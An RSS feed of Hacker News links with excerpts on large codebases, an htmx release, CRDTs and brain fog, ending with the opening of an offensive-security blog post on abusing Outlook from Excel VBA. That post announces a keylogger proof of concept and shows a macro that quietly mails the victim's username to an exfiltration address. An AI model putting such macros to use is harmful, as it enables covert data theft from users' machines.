<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 50]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 50. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Tue, 16 Feb 2021 01:06:24 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-50.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Tue, 16 Feb 2021 01:06:24 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[On Navigating a Large Codebase]]>
            </title>
            <description>
<![CDATA[
Score 130 | Comments 49 (<a href="https://news.ycombinator.com/item?id=26129190">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/ | <a href="https://web.archive.org/web/*/https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A while ago, I‚Äôve been working on a very large codebase that consisted of a few million lines of code.
Large systems are usually a big mess and this one was no exception.
Since this is a rather common problem in software engineering, I thought the internet would be
littered with stories about this topic.
There is a lot of talk about software carpentry, while software maintenance is rarely debated.
Either large programs are being maintained by dark matter developers or
nobody thinks that writing stories about large systems are interesting enough.</p><p>In the past I‚Äôve encountered a few of those large monsters and they seem to have a lot in common.
This article will try to present some of the problems and tricks that I am using when
I have to deal with them. Hopefully this will inspire others to write similar posts
and share tips from their own bag of tricks.</p><h2 id="large-codebase-problems">Large codebase problems</h2><p>The main problem of any large codebase is the extreme complexity that stems from the fact
that we live in a messy world of details that are very hard to describe and put into words.
The programming languages that we are using nowadays are still too primitive for that task,
and it takes a lot of lines and various layers of abstractions before we are able to convey the
rules of our world to the all mighty computer [1].</p><p>The following sections will present some of the common problems which I‚Äôve discovered during my
big system adventures.</p><p>A common trait of a large codebases is that at some point they become so large and bloated
that one person alone is no longer capable of understanding all its pieces. It seems to
me that after 100‚Äô000 lines of code, the maintenance related problems start to appear
as the complexity of the code simply dwarfs the capabilities of the human brain.
Such large systems are commonly maintained by more than one person, but with a large
group of people also come large organizational problems.</p><p>Within a large group of people the number of possible communication paths between them go bananas
and so it often happens that the ass no longer knows what the head is doing.
This misunderstanding in turn cause them to build the wrong thing that doesn‚Äôt fit
into the rest of the system. You might also know this situation under the term of
‚Äúthose people had no idea what they were doing, and we will do it right this time‚Äù which is
quite often floating around in the latest maintenance team.</p><p>That rarely happens though, because it‚Äôs likely the Towel of Babel situation all over again.</p><h3 id="loss-of-knowledge">Loss of knowledge</h3><p>Large systems are usually maintained by the ones who did not build them. Initial
developers often leave the company or move up in the pecking order to
work on other projects and are therefore no longer familiar with the system.
Sometimes the bright minds outsourced the initial development of the project
in the name of lowering the costs, just to pay tenfold in the later stages once they realize
the outsourcers developed the wrong thing. Even worse is the fact that the in house developers
didn‚Äôt gain the internal domain knowledge that is necessary for further maintenance of the system.</p><p>This presents a big problem for the new maintainers, as they can‚Äôt just go
around the company and ask the original developers about the initial design decisions.
Learning this tribal knowledge usually takes a lot of time, because the code is harder to read and
understand than it is to write. These days most developers seem to switch jobs every 2 to 3 years,
therefore the learning process has to be constantly going on, otherwise you might end up
with a large and expensive monster that nobody knows anything about [2].
For most of the past large projects on which I‚Äôve been working on, the team has usually
changed by the end of the first version.</p><p>Rigorously documenting every step is not the cure for this problem, because at some point all that
junk will become outdated and nobody will have the time to spend a year just reading the
documentation and figuring out how the pieces fit together [3].</p><h3 id="lack-of-knowledge">Lack of knowledge</h3><p>Large systems become large, because they are usually trying to solve every problem under the sun.
Often the organization that is embarking on such journey does not have enough experienced
employees on board to actually pull it off. Some like to say that pressure makes diamonds,
but sometimes it also crushes the things that are under.</p><p>It‚Äôs fine to have less experienced people working on a large system as long as they have the elders
overseeing their work. In the world where senior titles are handed left and right,
that is often not the case and it‚Äôs how you end up with a very fragile system that is suitable for
a replacement as soon as it was built. Most of the larger projects that I was working on and
were considered successes, had the core parts of the system written by experienced
developers. A significant chunks were also built by greenhorns, but they were usually
guided and their blast radius was limited to the less complex parts of the system.</p><h3 id="the-astronauts">The astronauts</h3><p>Big projects tend to attract the data modelers and other cultists who like to
get in the way of getting shit done. These architecture astronauts will endlessly
discuss the finer points of their UML data models and multithreaded layers of abstraction,
that will one day allow them to be the heroes of their own story by writing some well
encapsulated and ‚ÄúSOLID‚Äù code.</p><blockquote><p>Why IBM sales reps don‚Äôt have children?</p><p>Because all they do is sit on the bed telling their spouses how great it‚Äôs going to be.</p></blockquote><p>Meanwhile, the for loopers have to fight this creeping metadata bureaucracy
madness on a daily basis. The tools handed down to them from the ivory tower usually don‚Äôt stand
the heat of the battle, but that doesn‚Äôt bother the modelers who will try to fix
the problems with more obfuscation patterns. It‚Äôs how you end with a homebrewed middleware monstrosity,
because the 100 existing ones out there are obviously not up to the task of powering our little CRUD app.</p><h3 id="documentation-problems">Documentation problems</h3><blockquote><p>I like to keep documentation separated from the code. Who am I?</p><p>A fool, with an out of sync document.</p></blockquote><p>The documentation of any large system is almost always outdated.
The code is usually changing faster due to the endless edge cases of the system
that were not being thought of early on. The discovered edge case problems are
usually fixed by bolting additional functionality right on the spot.
The average code change of such patch is usually quite small,
but a few tweaks here and there accumulate over time until the original design no
longer matches with the reality.</p><p>Tweaking the code is usually simple as most people are familiar with the process. You pull the
code from the version control, you make your tweaks and then you push it back.
On the other hand updating the documentation is way more convoluted and usually involves the
whole ceremony, because the term documentation is actually a spaghetti of Word documents,
pdfs, spreadsheets, emails, wiki pages and some text files on some dude‚Äôs hard drive.</p><p>The corporate world still loves to use MS Word for writing technical documents, even though
it‚Äôs entirely unusable for this use case. The Word doesn‚Äôt support syntax highlighting for
code snippets and you get to play the game of ‚Äúmoving one image for 5 pixels to the
left will mess with your headings and right align all text.‚Äù
It also makes it very hard to have multiple people collaborating on the same document.
The version control still treats Word documents in the same way as binary blobs,
which makes merging changes and fixing merge conflicts far harder than it should be.
I still remember how people collaborated by working each on their own copy of the
document and having a documentation officer merging all the copies together
manually to avoid any merge conflicts. Fun times.</p><p>If you are lucky, you might be writing documentation in plain text, but then you may have to
get familiar with all kinds of weird Lovecraftian toolchains that are relying on
all sorts of ancient operating system specifics in order to produce a nicer looking document.</p><p>After all these years of progress, writing documentation is still an unpleasant process
due to all the pain surrounding the tools that we have to deal with on a daily basis.
Large projects ensure that not only is the documentation hard to write, it‚Äôs also
impossible to find and read due to the sheer number of documents [4].</p><h2 id="tackling-the-beast">Tackling the beast</h2><p>In this section I will describe my ways of tackling the problems of an unknown large codebase
that I often encounter in the wild.
As mentioned before, the main problem of large systems is that nobody can understand them
entirely and often you will be left wondering how the damn thing even works.</p><p>When you are trying to understand a specific part of a large system, it‚Äôs worth
taking the time to talk to the current maintainers. They usually know it well enough
to guide you through the jungle, so you can avoid the traps and get up to speed faster.
Sometimes you will encounter a situation where you will just have to figure it
out on your own, because nobody will have the answers to your questions.</p><p>Hopefully the following sections might give you some ideas on how to tackle such
situations.</p><h3 id="read-the-documentation">Read the documentation</h3><p>The easiest way to get familiar with a large system, is by going through its documentation and
actually reading it. Large systems usually contain
large swaths of outdated documentation, but even a slightly outdated document is
often better than not having it at all. Ask the elders about the current state of documentation,
so you don‚Äôt completely waste your time with deciphering the irrelevant documents.</p><p>Either way, the documentation will only give you an overview of the system. The details
behind design decisions are almost never mentioned and you will have to find another way.</p><h3 id="check-the-tests">Check the tests</h3><p>When I am trying to decipher how a specific part of the system is supposed to behave,
I usually check for tests. If they exist, you might want to scroll through them and hopefully
you will get another ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/">https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/</a></em></p>]]>
            </description>
            <link>https://blog.royalsloth.eu/posts/on-navigating-a-large-codebase/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26129190</guid>
            <pubDate>Sun, 14 Feb 2021 02:41:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Htmx 1.2.0 Release]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 18 (<a href="https://news.ycombinator.com/item?id=26128229">thread link</a>) | @crbelaus
<br/>
February 13, 2021 | https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/ | <a href="https://web.archive.org/web/*/https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h2>htmx 1.2.0 Release</h2>
<p>I'm happy to announce the <a href="https://unpkg.com/browse/htmx.org@1.2.0/">1.2.0 release</a> of htmx.</p>
<h3>New Features &amp; Major Changes</h3>
<ul>
<li><code>hx-vars</code> has been deprecated in favor of <code>hx-vals</code></li>
<li><code>hx-vals</code> now supports a <code>javascript:</code> prefix to achieve the behavior that <code>hx-vars</code> provided</li>
<li>The new <code>hx-headers</code> attribute allows you to add headers to a request via an attribute.  Like <code>hx-vals</code> it supports
JSON or javascript via the <code>javascript:</code> prefix</li>
<li><code>hx-include</code> will now include all inputs under an element, even if that element is not a form tag</li>
<li>The <a href="https://htmx.org/extensions/preload/">preload extension</a> now offers a <code>preload-images="true"</code> attribute that will aggressively load images in preloaded content</li>
<li>On requests driven by a history cache miss, the new <code>HX-History-Restore-Request</code> header is included so that the server
can differentiate between history requests and normal requests</li>
</ul>
<h3>Improvements &amp; Bug fixes</h3>
<ul>
<li>Improved handling of precedence of input values to favor the enclosing form (see <a href="https://github.com/bigskysoftware/htmx/commit/a10e43d619dc340aa324d37772c06a69a2f47ec9">here</a>)</li>
<li>Moved event filtering logic <em>after</em> <code>preventDefault</code> so filtering still allows events to be properly handled</li>
<li>No longer trigger after swap events on elements that have been removed via an <code>outerHTML</code> swap</li>
<li>Properly remove event handlers added to other elements when an element is removed from the DOM</li>
<li>Handle the <code>scroll:</code> modifier in <code>hx-swap</code> properly when an <code>outerHTML</code> swap occurs</li>
<li>Lots of docs fixes</li>
</ul>
<p>Enjoy!</p>

</div></div>]]>
            </description>
            <link>https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26128229</guid>
            <pubDate>Sat, 13 Feb 2021 23:51:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Laced with History: Causal Trees and Operational CRDTs (2018)]]>
            </title>
            <description>
<![CDATA[
Score 72 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26127570">thread link</a>) | @mcovalt
<br/>
February 13, 2021 | http://archagon.net/blog/2018/03/24/data-laced-with-history/ | <a href="https://web.archive.org/web/*/http://archagon.net/blog/2018/03/24/data-laced-with-history/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div id="sel_blog20180324data-laced-with-history">
<div>



<article>


<p><img src="http://archagon.net/images/blog/causal-trees/header.jpg"></p>

<p>Hello! This article took a while to cobble together. If you find it useful, please consider leaving a donation via <a href="https://donorbox.org/crdt-article"> </a>, <a href="https://www.buymeacoffee.com/archagon"> </a>, or <a href="ethereum:0x0d5dd8a8Cca8Bf7d0122F7A1Cc76c6b0666fCC56"> </a>. (Thought I'd try something new!) Or, just buy yourself a nice Roost through my <a href="http://amzn.to/2D7uYxz"> </a>. Donation or not, thank you for reading! üòä</p>

<p>(Sorry about the length! At some point in the distant past, this was supposed to be a short blog post. If you like, you can skip straight to the <a href="#demo-concurrent-editing-in-macos-and-ios">demo section</a> to get a sense of what this article is about.)</p>

<p>Embarrassingly, most of my app development to date has been confined to local devices. Programmers like to gloat about the stupendous mental castles they build of their circuitous, multi-level architectures, but not me. In truth, networks leave me quite perplexed. I start thinking about data serializing to bits, servers performing their arcane handshakes and voting rituals, merge conflicts pushing into app-space and starting the whole process over again‚Äîand it all just turns to mush in my head. For peace of mind, my code needs to be <em>locally provable</em>, and this means things like idempotent functions, decoupled modules, contiguous data structures, immutable objects. Networks, unfortunately, throw a giant wrench in the works.</p>

<p>Sometime last year, after realizing that most of my document-based apps would probably need to support sync and collaboration in the future, I decided to finally take a stab at the problem. Granted, there were tons of frameworks that promised to do the hard work of data model replication for me, but I didn‚Äôt want to black-box the most important part of my code. My gut told me that there had to be some arcane bit of foundational knowledge that would allow me to sync my documents in a refined and functional way, decoupled from the stateful spaghetti of the underlying network layer. Instead of downloading a Github framework and <a href="http://amzn.to/2iigBOI">smacking the build button</a>, I wanted to develop a base set of skills that would allow me to easily network <em>any</em> document-based app in the future, even if I was starting from scratch.</p>

<!--more-->

<p>The first order of business was to devise a wishlist for my fantastical system:</p>

<ul>
  <li>Most obviously, users should be able to edit their documents immediately, without even touching the network. (In other words, the system should only require <em>optimistic concurrency</em>.)</li>
  <li>Sync should happen in the background, entirely separate from the main application code, and any remote changes should be seamlessly integrated in real-time. (The user shouldn‚Äôt have to notice that the network is down.)</li>
  <li>Merge should always be automatic, even for concurrent edits. The user should never be faced with a ‚Äúpick the correct revision‚Äù dialog box.</li>
  <li>A user should be able to work on their document offline for an indefinite period of time without accruing ‚Äúsync debt‚Äù. (Meaning that if, for example, sync is accomplished by sending out mutation events, performance should not suffer even if the user spends a month offline and then sends all their hundreds of changes at once.)</li>
  <li>Secondary data structures and state should be minimized. Most of the extra information required for sync should be stored in the same place as the document, and moving the document to a new device should not break sync. (No out-of-band metadata or caches!)</li>
  <li>Network back-and-forth should be condensed to a bare minimum, and rollbacks and re-syncs should practically never happen. To the greatest possible degree, network communication should be stateless and dumb.</li>
  <li>To top it all off, my chosen technique had to pass the ‚ÄúPhD Test‚Äù. That is to say, one shouldn‚Äôt need a PhD to understand and implement the chosen approach for custom data models!</li>
</ul>

<p>After mulling over my bullet points, it occurred to me that the network problems I was dealing with‚Äîbackground cloud sync, editing across multiple devices, real-time collaboration, offline support, and reconciliation of distant or conflicting revisions‚Äîwere all pointing to the same question: was it possible to design a system where any two revisions of the same document could be merged deterministically and sensibly without requiring user intervention? Sync, per se, wasn‚Äôt the issue, since getting data from one device to another was essentially a solved problem. It‚Äôs what happened <em>after</em> sync that was troubling. On encountering a merge conflict, you‚Äôd be thrown into a busy conversation between the network, model, persistence, and UI layers just to get back into a consistent state. The data couldn‚Äôt be left alone to live its peaceful, functional life: every concurrent edit immediately became a cross-architectural matter. On the other hand, if two documents could always be made to merge, then most of that coordination hullabaloo could go out the window. Each part of the system could be made to work at its own pace.</p>

<p>Whether stored as a record in a database or as a stand-alone file, a document could be interpreted as a collection of basic data fields: registers, sequences, dictionaries, and so forth. Looking at the problem from a database perspective, it was actually quite simple to automatically resolve merge conflicts in this kind of table row: just keep overwriting each field with the version sporting the highest timestamp, <a href="https://en.wikipedia.org/wiki/Lamport_timestamps">logical</a> or otherwise. (Ignoring issues of inter-field consistency for now.) Of course, for anything other than basic registers, this was a terrible approach. Sequences and dictionaries weren‚Äôt just blobs of homogeneous data that were overwritten with every change, but complex, mutable structures that users were editing on a granular level. For such a fundamental problem, there was a surprising dearth of solutions out in the real world: most systems punted the task to app-space by asking the client to manually fix any merge conflicts or pick the correct version of a file. It seemed that if the problem of automatic merge for non-trivial data types could be solved‚Äîperhaps by exposing their local, type-specific mutation vocabulary to the storage and replication layers?‚Äîthen a solution to the higher-level problem of automatic document merge would fall within reach.</p>

<p>In hope of uncovering some prior art, I started by looking at the proven leader in the field, Google Docs. Venturing down the deep rabbit hole of <a href="https://en.wikipedia.org/wiki/Collaborative_real-time_editor">real-time collaborative editing</a> techniques, I discovered that many of the problems I faced fell under the umbrella of <a href="https://en.wikipedia.org/wiki/Eventual_consistency">strong eventual consistency</a>. Unlike the more conventional <a href="https://en.wikipedia.org/wiki/Strong_consistency">strong consistency</a> model, where all clients receive changes in identical order and rely on locking to some degree, strong <em>eventual</em> consistency allows clients to individually diverge and then arrive at a final, consistent result once each update has been received. (Or, in a word, when the network is <em>quiescent</em>.)</p>

<p>There were a number of tantalizing techniques to investigate, and I kept several questions in mind while doing my analysis. Could a given technique be generalized to arbitrary and novel data types? Did the technique pass the PhD Test? And was it possible to use the technique in an architecture with smart clients and dumb servers?</p>

<p>The reason for that last question was CloudKit Sharing, a framework introduced in iOS 10. For the most part, this framework functioned as a superset of regular CloudKit, requiring only minor code changes to enable document sharing in an app. A developer didn‚Äôt even have to worry about connecting users or dealing with UI: Apple did most of the hard work in the background while leveraging standard system dialogs. But almost two years later, <a href="https://github.com/search?l=Swift&amp;q=UICloudSharingController&amp;type=Code&amp;utf8=%E2%9C%93">on the order of no one</a> seemed to be using it. Why was this? Most other Apple APIs tended to be readily adopted, especially when they allowed the developer to expand into system areas which were normally out of bounds.</p>

<p>My hunch was that CloudKit Sharing forced the issue of real-time collaboration over a relatively dumb channel, which was a task outside the purview of conventional sync approaches. CloudKit allowed developers to easily store, retrieve, and listen for new data, but not much else besides. No third-party code was allowed to run on Apple‚Äôs servers, so merge conflicts had to be handled locally. But unlike in the single-user case, which presented limited opportunities for concurrent edits, you couldn‚Äôt just pop up a merge dialog every time another participant in your share made a change to your open document. The only remaining options seemed to be some sort of ugly, heuristic auto-merge or data-dropping last-write-wins, neither of which was acceptable for real-time use. Collaboration along the lines of Google Docs appeared to be impossible using this system! But was it really?</p>

<p>I realized that this was my prize to be won. If I could figure out a way to develop auto-merging documents, I‚Äôd be able to implement sync and collaboration in my apps over CloudKit while using Apple‚Äôs first-party sharing UI‚Äîall without having to pay for or manage my own servers. So this became my ultimate research goal: a collaborative iPhone text editing demo that synced entirely over CloudKit. (And here‚Äôs a spoiler: <a href="#demo-concurrent-editing-in-macos-and-ios">it worked!</a>)</p>





<p>There are a few basic terms critical to understanding eventual consistency. A network is comprised of <em>sites</em> (‚Äúdevices‚Äù, ‚Äúpeers‚Äù) operating in parallel, each one producing <em>operations</em> (‚Äúevents‚Äù, ‚Äúactions‚Äù) that mutate the data and exchange information with other sites. The first vital concept here is <strong>causality</strong>. An operation is <em>caused</em> by another operation when it directly modifies or otherwise involves the results of that operation, and determining causality is critical to reconstructing a sensible timeline (or <strong>linearization</strong>) of operations across the network. (An operation that <em>causes</em> another operation must always be ordered first.) However, we can‚Äôt always determine direct causality in a general way, so algorithms often assume that an operation is causally ahead of another one if the site generating the newer operation has already seen the older one at the time of its creation. (In other words, every operation already seen by a site at the time a new operation is created is in that operation‚Äôs <em>caus‚Ä¶</em></p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://archagon.net/blog/2018/03/24/data-laced-with-history/">http://archagon.net/blog/2018/03/24/data-laced-with-history/</a></em></p>]]>
            </description>
            <link>http://archagon.net/blog/2018/03/24/data-laced-with-history/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127570</guid>
            <pubDate>Sat, 13 Feb 2021 22:25:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Strategies to Reduce Brain Fog and Improve Clear Thinking]]>
            </title>
            <description>
<![CDATA[
Score 87 | Comments 90 (<a href="https://news.ycombinator.com/item?id=26126401">thread link</a>) | @evo_9
<br/>
February 13, 2021 | https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/ | <a href="https://web.archive.org/web/*/https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><div><hr>
<p>Mental fog is often described as a ‚Äúcloudy-headed‚Äù feeling.</p>
<p>Common conditions of brain fog include poor memory, difficulty focusing or concentrating, and struggling with articulation.</p>
<p>Imagine if you could concentrate your brain power into one bright beam and focus it like a laser on whatever you wish to accomplish.</p>
<p>Many people struggle to concentrate. And when you can‚Äôt concentrate, everything you do is harder and takes longer than you‚Äôd like.</p>
<h3><strong>Give up the&nbsp;clutter</strong></h3>
<p>Mess creates stress.</p>
<p>There‚Äôs a strong link between your physical space and your mental space.</p>
<p>Clutter is bad for your mind and health. It can create long-term, low-level anxiety.</p>
<p>When the book, <a rel="nofollow" href="https://amzn.to/2tvOPr0" data-href="http://amzn.to/2tvOPr0" target="_blank"><em>The Japanese Art of Reorganizing and Decluttering</em></a><em>,</em> by Marie Condo became a best-seller, it wasn‚Äôt too surprising.</p>
<p>We are all looking for ways to create more meaningful lives with less to distract us.</p>
<blockquote><p><strong><em>Get rid of clutter at your office, on your desk, in your room, and you will send a clear message of calm directly to your brain.</em></strong></p></blockquote>
<p>Start decluttering today in small, focused bursts. You‚Äôre not going to clean up your entire space in a day, so start small to make it a daily habit that sticks.</p>
<p>Set yourself up for success by making a plan and targeting specific areas you‚Äôre going to declutter, clean up, and organize over a prolonged period of time.</p>
<h3>Multi-tasking doesn‚Äôt&nbsp;work</h3>
<p>The ability to multi-task is a false badge of honor.</p>
<p>Task switching has a severe cost.</p>
<p>Your concentration suffers when you multitask.</p>
<p>It compromises how much actual time you spend doing productive work, because you‚Äôre continually unloading and reloading the hippocampus/short term memory.</p>
<p>Research shows that tasks switching actually burns more calories and fatigues your brain ‚Äì reducing your overall capacity for productive thought and work.</p>
<p>Commit to completing one task at a time.</p>
<p>Remove potential distractions (like silencing your mobile, turning off email alerts ) before you start deep work to avoid the temptation to switch between tasks.</p>
<p><strong>Use the 3-to-1 method!</strong></p>
<p>Narrow down your most important tasks to 3, and then give one task your undivided attention for a period of time.</p>
<p>Allow yourself to rotate between the three, giving yourself a good balance of singular focus and variety.</p>
<h3>Give up the urgent distraction</h3>
<p>Disconnect. Your productivity, creativity and next big idea depends on it.</p>
<p>Urgency wrecks productivity. Urgent but unimportant tasks are major distractions.</p>
<p>Last-minute distractions are not necessarily priorities.</p>
<p>Sometimes important tasks stare you right in the face, but you neglect them and respond to urgent but unimportant things.</p>
<p>You need to reverse that. It‚Äôs one the only ways to master your time.</p>
<blockquote><p><strong><em>Your ability to distinguish urgent and important tasks has a lot to do with your success.</em></strong></p></blockquote>
<p>Important tasks are things that contribute to your long-term mission, values, and goals. Separating these differences is simple enough to do once, but doing so continually can be tough.</p>
<h3>Stop feeding your&nbsp;comfort</h3>
<p>Comfort provides a state of mental security.</p>
<p>When you‚Äôre comfortable and life is good, your brain can release chemicals like dopamine and serotonin, which lead to happy feelings.</p>
<p>But in the long-term, comfort is bad for your brain.</p>
<blockquote><p><strong><em>Without mental stimulation dendrites, connections between brain neurons that keep information flowing, shrink or disappear altogether.</em></strong></p></blockquote>
<p>An active life increases dendrite networks and also increase the brain‚Äôs regenerating capacity, known as plasticity.</p>
<p>‚ÄúNeglect of intense learning leads plasticity systems to waste away,‚Äù says Norman Doidge in his book, <a rel="nofollow" href="https://amzn.to/2Fnh3to" data-href="http://amzn.to/2Fnh3to" target="_blank">The Brain That Changes Itself</a>.</p>
<p>Michael Merzenich, a pioneer of plasticity research, and author of <a rel="nofollow" href="https://amzn.to/2oXkPj3" data-href="http://amzn.to/2oXkPj3" target="_blank">Soft-wired: How the New Science of Brain Plasticity Can Change Your Life</a> says that going beyond the familiar is essential to brain health.</p>
<p>‚ÄúIt‚Äôs the willingness to leave the comfort zone that is the key to keeping the brain new,‚Äù he says.</p>
<p>Seeking new experiences, learning new skills, and opening the door to new ideas inspire us and educate us in a way improves mental clarity.</p>
<h3>Don‚Äôt sit&nbsp;still</h3>
<p>Sitting still all day, every day, is dangerous.</p>
<p>Love it or hate it, physical activity can have potent effects on your brain and mood.</p>
<blockquote><p><strong><em>The brain is often described as being ‚Äúlike a muscle‚Äù. Its needs to be exercised for better performance.</em></strong></p></blockquote>
<p>Research shows that moving your body can improve your cognitive function.</p>
<p>30‚Äì45 minutes of brisk walking, three times a week, can help fend off the mental wear and tear.</p>
<p>What you do with your body impinges on your mental faculties.</p>
<p>Find something you enjoy, then get up and do it. And most importantly, make it a habit.</p>
<h3>Stop consuming media and start creating&nbsp;instead</h3>
<p>It‚Äôs extremely easy to consume content.</p>
<p>You are passive. Even relaxed.</p>
<p>But for each piece of unlimited content you consume, it stops a piece of content you could have created.</p>
<p>Limit your mass media consumption.</p>
<p>Embrace the creation habit.</p>
<p>Start paying attention to the noise that you let seep into your eyes and ears.</p>
<p>Ask, Is this benefitting my life in any way?</p>
<p>Does all this information make me more prone to act?</p>
<p>Does it really make me more efficient? Does it move me forward in any significant way?</p>
<p><strong>Let creation determine consumption.</strong></p>
<p>Allow curiosity to lead you to discover and pursue something you deepy care about. Make time to create something unique.</p>
<p>The point is to get lost in awe and wonder like you did when you were a child. When you achieve that feeling from a certain activity, keep doing it!</p>
<p>Share your authentic self with the rest of us.</p>
<h4>Before you&nbsp;go‚Ä¶</h4>
<p>If you enjoyed this post, you will love <a rel="nofollow" href="https://postanly.ongoodbits.com/" data-href="https://postanly.ongoodbits.com" target="_blank">Postanly Weekly</a> (my free digest of the best productivity, behaviour change, and neuroscience posts). <a rel="nofollow" href="https://postanly.ongoodbits.com/" data-href="https://postanly.ongoodbits.com" target="_blank">Subscribe</a> and get a free copy of my new book, ‚Äú<em>The Power of One Percent Better: Small Gains, Maximum Results‚Äù. </em>Join over 40,000 people on a mission to build a better life.</p>
<p><em>Originally published at <a rel="nofollow" href="https://medium.com/personal-growth/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately-1bfee44f4dd7">medium.com</a></em></p>
</div></div></div>]]>
            </description>
            <link>https://thriveglobal.in/stories/want-to-reduce-brain-fog-and-improve-clear-thinking-give-up-these-things-immediately/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126401</guid>
            <pubDate>Sat, 13 Feb 2021 20:16:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The worst of the two worlds: Excel meets Outlook]]>
            </title>
            <description>
<![CDATA[
Score 237 | Comments 175 (<a href="https://news.ycombinator.com/item?id=26126067">thread link</a>) | @mooreds
<br/>
February 13, 2021 | https://adepts.of0x.cc/vba-outlook/ | <a href="https://web.archive.org/web/*/https://adepts.of0x.cc/vba-outlook/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content"> <article itemscope="" itemtype="https://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>Dear Fell<strong>owl</strong>ship, today‚Äôs homily is the last chapter of our trilogy about our epistolary-daemonic relationship with VBA. This time we are going to talk about how to interact with Outlook from Excel using macros, and also we are going to release a <strong>PoC where we turn Outlook into a keylogger</strong>. Please, take a seat and listen to the story.</p>  <p><em>We promise this is the last time <a href="https://twitter.com/TheXC3LL">@TheXC3LL</a> will publish about VBA. We have scheduled an exorcism this weekend to release his daemons, so he can write again about vulnerabilities and other stuff different to VBA.</em></p>  <p>In our first chapter we talked about the concept of <a href="https://adepts.of0x.cc/kerberoast-vba-macro/">‚ÄúHacking in a epistolary way‚Äù</a>, where we started to implement attacks and TTPs directly in VBA macros avoiding process injections, dropping binaries or calling external programs that are flagged (like Powershell). This time we are going to shift our focus to Outlook.</p> <p>First of all we have to say that you can interact with Outlook directly from other Microsoft Office apps via VBA using the object <code>Outlook.Application</code>. This means that we can abuse Outlook functionalities from within Excel, so we can look for confidential information inside the inbox or we can exfiltrate data via mails. To send a mail only a few lines are needed:</p> <div><div><pre><code><span>'https://docs.microsoft.com/es-es/office/vba/api/outlook.namespace</span>
<span>Sub</span> <span>send_mail_example</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>xOutApp</span><span>.</span><span>CreateItem</span><span>(</span><span>0</span><span>)</span>
    <span>xMailBody</span> <span>=</span> <span>"You did it!"</span>
    <span>On</span> <span>Error</span> <span>Resume</span> <span>Next</span>
    <span>With</span> <span>xOutMail</span>
        <span>.</span><span>To</span> <span>=</span> <span>"exfiltration.inbox@not-phising.cc"</span>
        <span>.</span><span>CC</span> <span>=</span> <span>""</span>
        <span>.</span><span>BCC</span> <span>=</span> <span>""</span>
        <span>.</span><span>Subject</span> <span>=</span> <span>"Macro executed "</span> <span>&amp;</span> <span>Environ</span><span>(</span><span>"username"</span><span>)</span>
        <span>.</span><span>Body</span> <span>=</span> <span>xMailBody</span>
        <span>.</span><span>Send</span>  
    <span>End</span> <span>With</span>
    <span>On</span> <span>Error</span> <span>GoTo</span> <span>0</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
